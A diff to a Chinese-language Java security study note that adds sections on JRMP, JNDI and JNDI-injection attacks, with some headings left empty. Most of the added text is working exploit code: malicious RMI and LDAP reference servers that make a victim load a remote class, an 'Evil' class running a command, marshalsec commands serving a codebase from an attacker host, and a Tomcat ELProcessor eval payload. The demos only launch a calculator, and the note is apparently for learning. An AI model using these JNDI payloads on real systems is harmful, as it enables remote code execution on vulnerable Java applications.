@@ -2,6 +2,12 @@
 
 
 
+## JRMP
+
+>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。
+
+
+
 ## 序列化的控制
 
 ### **Externalizable**
@@ -229,6 +235,391 @@ public class Exec {
 
 
 ## JNDI注入
+
+
+
+### 什么是JNDI
+
+>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。
+
+
+
+JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。
+
+
+
+### JNDI 的简单例子
+
+```java
+public interface RMIInterface extends Remote {
+    String hello() throws RemoteException;
+}
+
+public class RMIImpl extends UnicastRemoteObject implements RMIInterface {
+    protected RMIImpl() throws RemoteException {
+        super();
+    }
+
+    @Override
+    public String hello() throws RemoteException {
+        System.out.println("call hello().");
+        return "this is hello().";
+    }
+
+}
+```
+
+
+
+#### server
+
+```java
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class JNDIServer {
+
+    public static void main(String[] args) {
+        try {
+            Registry registry = LocateRegistry.createRegistry(1099);
+            registry.bind("hello", new RMIImpl());
+        } catch (RemoteException e) {
+            e.printStackTrace();
+        } catch (AlreadyBoundException e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+```
+
+
+
+#### client
+
+
+
+```java
+import javax.naming.NamingException;
+import java.rmi.NotBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class JNDIClient {
+    public static void main(String[] args) throws NamingException, RemoteException {
+        try {
+            Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
+            RMIInterface helloService = (RMIInterface) registry.lookup("hello");
+            System.out.println(helloService.hello());
+
+        } catch (NotBoundException e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+```
+
+
+
+
+
+### 攻击JNDI服务端
+
+#### RMI
+
+##### 利用条件
+
+使用条件：jdk <jdk8u121 
+
+在jdk8u121版本开始，Oracle通过默认设置系统变量com.sun.jndi.rmi.object.trustURLCodebase为false，将导致通过rmi的方式加载远程的字节码不会被信任
+
+
+
+##### server
+
+```java
+public class JNDI_RMI {
+    public static void main(String[] args) {
+        try {
+            Registry registry = LocateRegistry.createRegistry(1099);
+            Reference reference = new Reference("Evil","Evil","http://127.0.0.1:8000/");
+            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+            registry.bind("evil",referenceWrapper);
+        } catch (RemoteException e) {
+            e.printStackTrace();
+        } catch (AlreadyBoundException e) {
+            e.printStackTrace();
+        } catch (NamingException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+
+
+##### client
+
+```java
+public class JNDIClient {
+    public static void main(String[] args) throws NamingException, RemoteException {
+
+        try {
+            new InitialContext().lookup("rmi://127.0.0.1:1099/evil");
+        } catch (NamingException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+
+
+##### evil class
+
+```java
+public class Evil implements Serializable {
+    public Evil() throws Exception {
+        java.lang.Runtime.getRuntime().exec("calc.exe");
+    }
+
+}
+```
+
+
+
+
+
+##### 利用工具起RMI 服务
+
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/#ExportObject 8088
+```
+
+
+
+
+
+#### LDAP
+
+##### 注意
+
+在jdk8u191开始，引入JRP290，加入了反序列化类过滤
+
+
+
+##### server
+
+```java
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+
+public class LdapServer {
+
+  private static final String LDAP_BASE = "dc=example,dc=com";
+
+  public static void main(String[] args) {
+    run();
+  }
+
+  public static void run() {
+    int port = 1099;
+    //TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
+    String url = "http://localhost/#Calc";
+    try {
+      InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+      config.setListenerConfigs(new InMemoryListenerConfig(
+          "listen", //$NON-NLS-1$
+          InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
+          port,
+          ServerSocketFactory.getDefault(),
+          SocketFactory.getDefault(),
+          (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+      config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
+      InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+      System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
+      ds.startListening();
+
+    } catch (Exception e) {
+      e.printStackTrace();
+    }
+  }
+
+  private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+    private URL codebase;
+
+
+    /**
+     *
+     */
+    public OperationInterceptor(URL cb) {
+      this.codebase = cb;
+    }
+
+
+    /**
+     * {@inheritDoc}
+     *
+     * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
+     */
+    @Override
+    public void processSearchResult(InMemoryInterceptedSearchResult result) {
+      String base = result.getRequest().getBaseDN();
+      Entry e = new Entry(base);
+      try {
+        sendResult(result, base, e);
+      } catch (Exception e1) {
+        e1.printStackTrace();
+      }
+
+    }
+
+
+    protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
+        throws LDAPException, MalformedURLException {
+      URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(""));
+      System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
+      e.addAttribute("javaClassName", "Calc");
+      String cbstring = this.codebase.toString();
+      int refPos = cbstring.indexOf('#');
+      if (refPos > 0) {
+        cbstring = cbstring.substring(0, refPos);
+      }
+      e.addAttribute("javaCodeBase", cbstring);
+      e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+      e.addAttribute("javaFactory", this.codebase.getRef());
+      result.sendSearchEntry(e);
+      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+    }
+
+  }
+}
+```
+
+
+
+##### client
+
+```java
+public class JNDIClient {
+    public static void main(String[] args) throws NamingException, RemoteException {
+
+        try {
+            new InitialContext().lookup("ldap://127.0.0.1:1099/evil");
+        } catch (NamingException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+
+
+##### evil class
+
+```java
+public class Evil implements Serializable {
+    public Evil() throws Exception {
+        java.lang.Runtime.getRuntime().exec("calc.exe");
+    }
+
+}
+```
+
+
+
+##### 利用工具起LDAP服务
+
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/文件夹/#ExportObject 8088
+```
+
+
+
+#### tomcat-el
+
+##### 利用条件
+
+PS：使用这种方式，需要lookup的客户端存在以下依赖
+
+```xml
+<dependency>
+  <groupId>org.apache.tomcat.embed</groupId>
+  <artifactId>tomcat-embed-el</artifactId>
+  <version>8.5.15</version>
+</dependency>
+```
+
+
+
+##### server
+
+```java
+public class JNDI_Tomcat_EL {
+
+    public static void main(String[] args) throws Exception {
+        Registry registry = LocateRegistry.createRegistry(1098);
+        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
+        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
+        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
+        registry.bind("EvalObj", referenceWrapper);
+        System.out.println("the Server is bind rmi://127.0.0.1:1098/EvalObj");
+    }
+}
+```
+
+
+
+##### client
+
+```java
+public class JNDIClient {
+    public static void main(String[] args) throws NamingException, RemoteException {
+
+        try {
+            new InitialContext().lookup("rmi://127.0.0.1:1099/hello");
+        } catch (NamingException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+
+
+### 攻击Registry
+
+
+
+### 攻击JRMP
+
+#### 攻击服务端
+
+
+
+#### 攻击客户端
+
+
 
 
 
@@ -542,3 +933,17 @@ jdbc也可以直接读文件，但是要设置：`allowLoadLocalInfile=true`
 ## 注意
 
  `Runtime.getRuntime().exec()`中不能使用管道符等bash需要的方法，工具： http://www.jackson-t.ca/runtime-exec-payloads.html 
+
+
+
+## 学习文章
+
+https://xz.aliyun.com/t/7079#toc-3
+
+
+
+https://xz.aliyun.com/t/7264
+
+https://xz.aliyun.com/t/6633
+
+https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
